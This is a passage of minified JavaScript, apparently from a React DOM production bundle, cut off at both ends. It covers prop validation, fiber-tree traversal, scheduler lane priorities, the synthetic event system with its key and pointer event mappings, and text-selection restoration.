n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(C(61))}if(n.style!=null&&typeof n.style!="object")throw Error(C(62))}}function ba(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var xa=null;function Sl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var _a=null,Pt=null,Nt=null;function Oo(e){if(e=Gs(e)){if(typeof _a!="function")throw Error(C(280));var n=e.stateNode;n&&(n=yi(n),_a(e.stateNode,e.type,n))}}function Du(e){Pt?Nt?Nt.push(e):Nt=[e]:Pt=e}function ju(){if(Pt){var e=Pt,n=Nt;if(Nt=Pt=null,Oo(e),n)for(e=0;e<n.length;e++)Oo(n[e])}}function Bu(e,n){return e(n)}function Fu(){}var ji=!1;function Uu(e,n,t){if(ji)return e(n,t);ji=!0;try{return Bu(e,n,t)}finally{ji=!1,(Pt!==null||Nt!==null)&&(Fu(),ju())}}function xs(e,n){var t=e.stateNode;if(t===null)return null;var s=yi(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(C(231,n,typeof t));return t}var Sa=!1;if(gn)try{var Kt={};Object.defineProperty(Kt,"passive",{get:function(){Sa=!0}}),window.addEventListener("test",Kt,Kt),window.removeEventListener("test",Kt,Kt)}catch{Sa=!1}function Hh(e,n,t,s,r,i,a,l,o){var c=Array.prototype.slice.call(arguments,3);try{n.apply(t,c)}catch(u){this.onError(u)}}var ds=!1,zr=null,Dr=!1,Ea=null,Vh={onError:function(e){ds=!0,zr=e}};function Wh(e,n,t,s,r,i,a,l,o){ds=!1,zr=null,Hh.apply(Vh,arguments)}function $h(e,n,t,s,r,i,a,l,o){if(Wh.apply(this,arguments),ds){if(ds){var c=zr;ds=!1,zr=null}else throw Error(C(198));Dr||(Dr=!0,Ea=c)}}function dt(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Hu(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function Mo(e){if(dt(e)!==e)throw Error(C(188))}function Gh(e){var n=e.alternate;if(!n){if(n=dt(e),n===null)throw Error(C(188));return n!==e?null:e}for(var t=e,s=n;;){var r=t.return;if(r===null)break;var i=r.alternate;if(i===null){if(s=r.return,s!==null){t=s;continue}break}if(r.child===i.child){for(i=r.child;i;){if(i===t)return Mo(r),e;if(i===s)return Mo(r),n;i=i.sibling}throw Error(C(188))}if(t.return!==s.return)t=r,s=i;else{for(var a=!1,l=r.child;l;){if(l===t){a=!0,t=r,s=i;break}if(l===s){a=!0,s=r,t=i;break}l=l.sibling}if(!a){for(l=i.child;l;){if(l===t){a=!0,t=i,s=r;break}if(l===s){a=!0,s=i,t=r;break}l=l.sibling}if(!a)throw Error(C(189))}}if(t.alternate!==s)throw Error(C(190))}if(t.tag!==3)throw Error(C(188));return t.stateNode.current===t?e:n}function Vu(e){return e=Gh(e),e!==null?Wu(e):null}function Wu(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=Wu(e);if(n!==null)return n;e=e.sibling}return null}var $u=Me.unstable_scheduleCallback,Io=Me.unstable_cancelCallback,Yh=Me.unstable_shouldYield,qh=Me.unstable_requestPaint,J=Me.unstable_now,Xh=Me.unstable_getCurrentPriorityLevel,El=Me.unstable_ImmediatePriority,Gu=Me.unstable_UserBlockingPriority,jr=Me.unstable_NormalPriority,Kh=Me.unstable_LowPriority,Yu=Me.unstable_IdlePriority,hi=null,tn=null;function Qh(e){if(tn&&typeof tn.onCommitFiberRoot=="function")try{tn.onCommitFiberRoot(hi,e,void 0,(e.current.flags&128)===128)}catch{}}var Xe=Math.clz32?Math.clz32:ef,Zh=Math.log,Jh=Math.LN2;function ef(e){return e>>>=0,e===0?32:31-(Zh(e)/Jh|0)|0}var tr=64,sr=4194304;function ls(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Br(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,r=e.suspendedLanes,i=e.pingedLanes,a=t&268435455;if(a!==0){var l=a&~r;l!==0?s=ls(l):(i&=a,i!==0&&(s=ls(i)))}else a=t&~r,a!==0?s=ls(a):i!==0&&(s=ls(i));if(s===0)return 0;if(n!==0&&n!==s&&!(n&r)&&(r=s&-s,i=n&-n,r>=i||r===16&&(i&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-Xe(n),r=1<<t,s|=e[t],n&=~r;return s}function nf(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function tf(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,r=e.expirationTimes,i=e.pendingLanes;0<i;){var a=31-Xe(i),l=1<<a,o=r[a];o===-1?(!(l&t)||l&s)&&(r[a]=nf(l,n)):o<=n&&(e.expiredLanes|=l),i&=~l}}function Ta(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function qu(){var e=tr;return tr<<=1,!(tr&4194240)&&(tr=64),e}function Bi(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function Ws(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Xe(n),e[n]=t}function sf(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var r=31-Xe(t),i=1<<r;n[r]=0,s[r]=-1,e[r]=-1,t&=~i}}function Tl(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-Xe(t),r=1<<s;r&n|e[s]&n&&(e[s]|=n),t&=~r}}var H=0;function Xu(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Ku,Cl,Qu,Zu,Ju,Ca=!1,rr=[],On=null,Mn=null,In=null,_s=new Map,Ss=new Map,Cn=[],rf="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function zo(e,n){switch(e){case"focusin":case"focusout":On=null;break;case"dragenter":case"dragleave":Mn=null;break;case"mouseover":case"mouseout":In=null;break;case"pointerover":case"pointerout":_s.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ss.delete(n.pointerId)}}function Qt(e,n,t,s,r,i){return e===null||e.nativeEvent!==i?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:i,targetContainers:[r]},n!==null&&(n=Gs(n),n!==null&&Cl(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,r!==null&&n.indexOf(r)===-1&&n.push(r),e)}function af(e,n,t,s,r){switch(n){case"focusin":return On=Qt(On,e,n,t,s,r),!0;case"dragenter":return Mn=Qt(Mn,e,n,t,s,r),!0;case"mouseover":return In=Qt(In,e,n,t,s,r),!0;case"pointerover":var i=r.pointerId;return _s.set(i,Qt(_s.get(i)||null,e,n,t,s,r)),!0;case"gotpointercapture":return i=r.pointerId,Ss.set(i,Qt(Ss.get(i)||null,e,n,t,s,r)),!0}return!1}function ep(e){var n=Qn(e.target);if(n!==null){var t=dt(n);if(t!==null){if(n=t.tag,n===13){if(n=Hu(t),n!==null){e.blockedOn=n,Ju(e.priority,function(){Qu(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function br(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=Aa(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);xa=s,t.target.dispatchEvent(s),xa=null}else return n=Gs(t),n!==null&&Cl(n),e.blockedOn=t,!1;n.shift()}return!0}function Do(e,n,t){br(e)&&t.delete(n)}function lf(){Ca=!1,On!==null&&br(On)&&(On=null),Mn!==null&&br(Mn)&&(Mn=null),In!==null&&br(In)&&(In=null),_s.forEach(Do),Ss.forEach(Do)}function Zt(e,n){e.blockedOn===n&&(e.blockedOn=null,Ca||(Ca=!0,Me.unstable_scheduleCallback(Me.unstable_NormalPriority,lf)))}function Es(e){function n(r){return Zt(r,e)}if(0<rr.length){Zt(rr[0],e);for(var t=1;t<rr.length;t++){var s=rr[t];s.blockedOn===e&&(s.blockedOn=null)}}for(On!==null&&Zt(On,e),Mn!==null&&Zt(Mn,e),In!==null&&Zt(In,e),_s.forEach(n),Ss.forEach(n),t=0;t<Cn.length;t++)s=Cn[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<Cn.length&&(t=Cn[0],t.blockedOn===null);)ep(t),t.blockedOn===null&&Cn.shift()}var Lt=bn.ReactCurrentBatchConfig,Fr=!0;function of(e,n,t,s){var r=H,i=Lt.transition;Lt.transition=null;try{H=1,Al(e,n,t,s)}finally{H=r,Lt.transition=i}}function cf(e,n,t,s){var r=H,i=Lt.transition;Lt.transition=null;try{H=4,Al(e,n,t,s)}finally{H=r,Lt.transition=i}}function Al(e,n,t,s){if(Fr){var r=Aa(e,n,t,s);if(r===null)Xi(e,n,s,Ur,t),zo(e,s);else if(af(r,e,n,t,s))s.stopPropagation();else if(zo(e,s),n&4&&-1<rf.indexOf(e)){for(;r!==null;){var i=Gs(r);if(i!==null&&Ku(i),i=Aa(e,n,t,s),i===null&&Xi(e,n,s,Ur,t),i===r)break;r=i}r!==null&&s.stopPropagation()}else Xi(e,n,s,null,t)}}var Ur=null;function Aa(e,n,t,s){if(Ur=null,e=Sl(s),e=Qn(e),e!==null)if(n=dt(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Hu(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return Ur=e,null}function np(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Xh()){case El:return 1;case Gu:return 4;case jr:case Kh:return 16;case Yu:return 536870912;default:return 16}default:return 16}}var Pn=null,Pl=null,xr=null;function tp(){if(xr)return xr;var e,n=Pl,t=n.length,s,r="value"in Pn?Pn.value:Pn.textContent,i=r.length;for(e=0;e<t&&n[e]===r[e];e++);var a=t-e;for(s=1;s<=a&&n[t-s]===r[i-s];s++);return xr=r.slice(e,1<s?1-s:void 0)}function _r(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function ir(){return!0}function jo(){return!1}function De(e){function n(t,s,r,i,a){this._reactName=t,this._targetInst=r,this.type=s,this.nativeEvent=i,this.target=a,this.currentTarget=null;for(var l in e)e.hasOwnProperty(l)&&(t=e[l],this[l]=t?t(i):i[l]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?ir:jo,this.isPropagationStopped=jo,this}return K(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=ir)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=ir)},persist:function(){},isPersistent:ir}),n}var Gt={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Nl=De(Gt),$s=K({},Gt,{view:0,detail:0}),uf=De($s),Fi,Ui,Jt,fi=K({},$s,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Ll,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Jt&&(Jt&&e.type==="mousemove"?(Fi=e.screenX-Jt.screenX,Ui=e.screenY-Jt.screenY):Ui=Fi=0,Jt=e),Fi)},movementY:function(e){return"movementY"in e?e.movementY:Ui}}),Bo=De(fi),pf=K({},fi,{dataTransfer:0}),df=De(pf),hf=K({},$s,{relatedTarget:0}),Hi=De(hf),ff=K({},Gt,{animationName:0,elapsedTime:0,pseudoElement:0}),mf=De(ff),gf=K({},Gt,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),yf=De(gf),vf=K({},Gt,{data:0}),Fo=De(vf),wf={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},kf={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},bf={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function xf(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=bf[e])?!!n[e]:!1}function Ll(){return xf}var _f=K({},$s,{key:function(e){if(e.key){var n=wf[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=_r(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?kf[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Ll,charCode:function(e){return e.type==="keypress"?_r(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?_r(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Sf=De(_f),Ef=K({},fi,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Uo=De(Ef),Tf=K({},$s,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Ll}),Cf=De(Tf),Af=K({},Gt,{propertyName:0,elapsedTime:0,pseudoElement:0}),Pf=De(Af),Nf=K({},fi,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Lf=De(Nf),Rf=[9,13,27,32],Rl=gn&&"CompositionEvent"in window,hs=null;gn&&"documentMode"in document&&(hs=document.documentMode);var Of=gn&&"TextEvent"in window&&!hs,sp=gn&&(!Rl||hs&&8<hs&&11>=hs),Ho=" ",Vo=!1;function rp(e,n){switch(e){case"keyup":return Rf.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function ip(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var yt=!1;function Mf(e,n){switch(e){case"compositionend":return ip(n);case"keypress":return n.which!==32?null:(Vo=!0,Ho);case"textInput":return e=n.data,e===Ho&&Vo?null:e;default:return null}}function If(e,n){if(yt)return e==="compositionend"||!Rl&&rp(e,n)?(e=tp(),xr=Pl=Pn=null,yt=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return sp&&n.locale!=="ko"?null:n.data;default:return null}}var zf={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Wo(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!zf[e.type]:n==="textarea"}function ap(e,n,t,s){Du(s),n=Hr(n,"onChange"),0<n.length&&(t=new Nl("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var fs=null,Ts=null;function Df(e){yp(e,0)}function mi(e){var n=kt(e);if(Nu(n))return e}function jf(e,n){if(e==="change")return n}var lp=!1;if(gn){var Vi;if(gn){var Wi="oninput"in document;if(!Wi){var $o=document.createElement("div");$o.setAttribute("oninput","return;"),Wi=typeof $o.oninput=="function"}Vi=Wi}else Vi=!1;lp=Vi&&(!document.documentMode||9<document.documentMode)}function Go(){fs&&(fs.detachEvent("onpropertychange",op),Ts=fs=null)}function op(e){if(e.propertyName==="value"&&mi(Ts)){var n=[];ap(n,Ts,e,Sl(e)),Uu(Df,n)}}function Bf(e,n,t){e==="focusin"?(Go(),fs=n,Ts=t,fs.attachEvent("onpropertychange",op)):e==="focusout"&&Go()}function Ff(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return mi(Ts)}function Uf(e,n){if(e==="click")return mi(n)}function Hf(e,n){if(e==="input"||e==="change")return mi(n)}function Vf(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Qe=typeof Object.is=="function"?Object.is:Vf;function Cs(e,n){if(Qe(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var r=t[s];if(!ua.call(n,r)||!Qe(e[r],n[r]))return!1}return!0}function Yo(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function qo(e,n){var t=Yo(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Yo(t)}}function cp(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?cp(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function up(){for(var e=window,n=Ir();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Ir(e.document)}return n}function Ol(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Wf(e){var n=up(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&cp(t.ownerDocument.documentElement,t)){if(s!==null&&Ol(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var r=t.textContent.length,i=Math.min(s.start,r);s=s.end===void 0?i:Math.min(s.end,r),!e.extend&&i>s&&(r=s,s=i,i=r),r=qo(t,i);var a=qo(t,s);r&&a&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==a.node||e.focusOffset!==a.offset)&&(n=n.createRange(),n.setStart(r.node,r.offset),e.removeAllRanges(),i>s?(e.addRange(n),e.extend(a.node,a.offset)):(n.setEnd(a.node,a.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var $f=gn&&"documentMode"in document&&11>=document.documentMode,vt=null,Pa=null,ms=null,Na=!1;function Xo(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Na||vt==null||vt!==Ir(s)||(s=vt,"selectionStart"in s&&Ol(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),ms&&Cs(ms,s)||(ms=s,s=Hr(Pa,"onSelect"),0<s.length&&(n=new Nl("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=vt)))}function ar(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var wt={animationend:ar("Animation","AnimationEnd"),animationiteration:ar("Animation","AnimationIteration"),animationstart:ar("Animation","AnimationStart"),transitionend:ar("Transition","TransitionEnd")},$i={},pp={};gn&&(pp=document.createElement("div").style,"AnimationEvent"in window||(delete wt.animationend.animation,delete wt.animationiteration.animation,delete wt.animationstart.animation),"TransitionEvent"in window||delete wt.transitionend.transition);function gi(e){if($i[e])return $i[e];if(!wt[e])return e;var n=wt[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in pp)return $i[e]=n[t];return e}var dp=gi("animationend"),hp=gi("animationiteration"),fp=gi("animationstart"),mp=gi("transitionend"),gp=new Map,Ko="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Wn(e,n){gp.set(e,n),pt(n,[e])}for(var Gi=0;Gi<Ko.length;Gi++){var Yi=Ko[Gi],Gf=Yi.toLowerCase(),Yf=Yi[0].toUpperCase()+Yi.slice(1);Wn(Gf,"on"+Yf)}Wn(dp,"onAnimationEnd");Wn(hp,"onAnimationIteration");Wn(fp,"onAnimationStart");Wn("dblclick","onDoubleClick");Wn("focusin","onFocus");Wn("focusout","onBlur");Wn(mp,"onTransitionEnd");zt("onMouseEnter",["mouseout","mouseover"]);zt("onMouseLeave",["mouseout","mouseover"]);zt("onPointerEnter",["pointerout","pointerover"]);zt("onPointerLeave",["pointerout","pointerover"]);pt("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));pt("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));pt("onBeforeInput",["compositionend","keypress","textInput","paste"]);pt("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));pt("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));pt("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var os="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),qf=new Set("cancel close invalid load scroll toggle".split(" ").concat(os));function Qo(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,$h(s,n,void 0,e),e.currentTarget=null}function yp(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],r=s.event;s=s.listeners;e:{var i=void 0;if(n)for(var a=s.length-1;0<=a;a--){var l=s[a],o=l.instance,c=l.currentTarget;if(l=l.listener,o!==i&&r.isPropagationStopped())break e;Qo(r,l,c),i=o}else for(a=0;a<s.length;a++){if(l=s[a],o=l.instance,c=l.currentTarget,l=l.listener,o!==i&&r.isPropagationStopped())break e;Qo(r,l,c),i=o}}}if(Dr)throw e=Ea,Dr=!1,Ea=null,e}function $(e,n){var t=n[Ia];t===void 0&&(t=n[Ia]=new Set);var s=e+"__bubble";t.has(s)||(vp(n,e,2,!1),t.add(s))}function qi(e,n,t){var s=0;n&&(s|=4),vp(t,e,s,n)}var lr="_reactListening"+Math.random().toString(36).slice(2);function As(e){if(!e[lr]){e[lr]=!0,Eu.forEach(function(t){t!=="selectionchange"&&(qf.has(t)||qi(t,!1,e),qi(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[lr]||(n[lr]=!0,qi("selectionchange",!1,n))}}function vp(e,n,t,s){switch(np(n)){case 1:var r=of;break;case 4:r=cf;break;default:r=Al}t=r.bind(null,n,t,e),r=void 0,!Sa||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(r=!0),s?r!==void 0?e.addEventListener(n,t,{capture:!0,passive:r}):e.addEventListener(n,t,!0):r!==void 0?e.addEventListener(n,t,{passive:r}):e.addEventListener(n,t,!1)}function Xi(e,n,t,s,r){var i=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var a=s.tag;if(a===3||a===4){var l=s.stateNode.containerInfo;if(l===r||l.nodeType===8&&l.parentNode===r)break;if(a===4)for(a=s.return;a!==null;){var o=a.tag;if((o===3||o===4)&&(o=a.stateNode.containerInfo,o===r||o.nodeType===8&&o.parentNode===r))return;a=a.return}for(;l!==null;){if(a=Qn(l),a===null)return;if(o=a.tag,o===5||o===6){s=i=a;continue e}l=l.parentNode}}s=s.return}Uu(function(){var c=i,u=Sl(t),h=[];e:{var f=gp.get(e);if(f!==void 0){var g=Nl,k=e;switch(e){case"keypress":if(_r(t)===0)break e;case"keydown":case"keyup":g=Sf;break;case"focusin":k="focus",g=Hi;break;case"focusout":k="blur",g=Hi;break;case"beforeblur":case"afterblur":g=Hi;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":g=Bo;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":g=df;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":g=Cf;break;case dp:case hp:case fp:g=mf;break;case mp:g=Pf;break;case"scroll":g=uf;break;case"wheel":g=Lf;break;case"copy":case"cut":case"paste":g=yf;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":g=Uo}var y=(n&4)!==0,w=!y&&e==="scroll",d=y?f!==null?f+"Capture":null:f;y=[];for(var p=c,m;p!==null;){m=p;var v=m.stateNode;if(m.tag===5&&v!==null&&(m=v,d!==null&&(v=xs(p,d),v!=null&&y.push(Ps(p,v,m)))),w)break;p=p.return}0<y.length&&(f=new g(f,k,null,t,u),h.push({event:f,listeners:y}))}}if(!(n&7)){e:{if(f=e==="mouseover"||e==="pointerover",g=e==="mouseout"||e==="pointerout",f&&t!==xa&&(k=t.relatedTarget||t.fromElement)&&(Qn(k)||k[yn]))break 